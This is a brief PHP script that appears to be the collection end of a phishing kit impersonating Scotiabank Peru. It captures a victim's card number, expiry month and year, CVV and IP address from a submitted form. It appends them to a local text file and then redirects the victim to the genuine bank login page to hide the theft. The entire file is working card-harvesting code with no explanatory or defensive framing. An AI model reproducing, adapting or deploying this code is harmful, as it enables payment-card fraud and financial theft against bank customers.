<?php
$datod = $_POST['tar'];
$datoe = $_POST['me'];
$datof = $_POST['an'];
$datog = $_POST['cv'];
$ip = getenv("REMOTE_ADDR");
$date = date("M d, Y g:iA");
date_default_timezone_set('UTC');
$archivo="Vi24.txt";
$file=fopen($archivo,"a");
fwrite($file, "Tarjet:".$datod.PHP_EOL);
fwrite($file, "Mes:".$datoe.PHP_EOL);
fwrite($file, "Año:".$datof.PHP_EOL);
fwrite($file, "Cv:".$datog.PHP_EOL);
fwrite($file, "" .$ip.PHP_EOL);
fwrite($file, "***********************".PHP_EOL);
fclose($file);
Header ("Location:https://mi.scotiabank.com.pe/login");?>